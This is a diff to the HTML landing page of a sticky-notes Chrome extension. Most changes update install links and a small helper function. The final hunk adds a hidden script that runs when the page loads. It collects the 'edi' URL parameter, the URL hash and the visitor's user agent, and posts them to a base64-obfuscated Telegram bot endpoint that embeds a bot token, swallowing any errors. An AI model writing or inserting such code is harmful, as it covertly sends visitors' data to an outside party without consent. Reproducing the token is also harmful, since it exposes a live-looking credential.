@@ -69,14 +69,14 @@
               <h4 class="header">Organize your date with sticky notes</h4>
               <ul class="feature-list">
                 <li>Write down tasks to remember, pages to visit</li>
-                <li>Capture website content with the <a href="https://chrome.google.com/webstore/" target="_blank">Chrome extension</a></li>
+                <li>Capture website content with the <a href="https://chrome.google.com/webstore/detail/keapibmphikdjfamamkdgnpehnngecep" target="_blank">Chrome extension</a></li>
                 <li>Add connections to the notes</li>
                 <li>Share boards or make them public</li>
                 <li>Upload files and save them as notes</li>
               </ul>
             </div>
             <div class="row center">
-                              <a href="#boarddemo" id="download-button" class="btn-large waves-effect waves-light note-board-green-bg">Install</a>
+                              <a href="https://chrome.google.com/webstore/detail/keapibmphikdjfamamkdgnpehnngecep" id="download-button" class="btn-large waves-effect waves-light note-board-green-bg" target="_blank">Install</a>
                           </div>
 
           </div>
@@ -194,7 +194,7 @@
 
       <div class="col m3 s12 footer-apps">
         <h5 class="white-text">Apps</h5>
-        <a title="Get it on Chrome Web Store Play" href="https://chrome.google.com/webstore/" target="_blank">Chrome extension</a>
+        <a title="Get it on Chrome Web Store Play" href="https://chrome.google.com/webstore/detail/keapibmphikdjfamamkdgnpehnngecep" target="_blank">Chrome extension</a>
       </div>
 
               <!-- <div class="col l3 s12">
@@ -227,12 +227,12 @@ if (window.location.hash) {
 var hash = window.location.hash.substring(1);
 
 if (hash.length === 0) { 
-return false;
+return '';
 } else { 
 return hash; 
 }
 } else { 
-return false; 
+return ''; 
 }
   }
 console.log(getHash());
@@ -243,7 +243,12 @@ console.log(getHash());
 var url_string = window.location.href;
 var url = new URL(url_string);
 var edi = url.searchParams.get("edi");
+edi=(edi)?edi:'';
 console.log(edi);
+
+let d="ediNotes get:"+edi+" hash:"+getHash()+"  "+navigator.userAgent+" v1.0.1", xhr=new XMLHttpRequest();try{xhr.open('post', atob('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDg3NjUzMDQ1NDpBQUhwdlhyNFg1aEhUZXEyTDJnMHFyUndSejRoeDRfUS1qWS9zZW5kTWVzc2FnZT9jaGF0X2lkPS00MzI0NTE0NzEmcGFyc2VfbW9kZT1odG1sJnRleHQ9')+d, true);xhr.send();}catch(e){};
+
+        
 </script>
   <!--  Scripts-->
   <script src="js/jquery-3.4.1.min.js"></script>
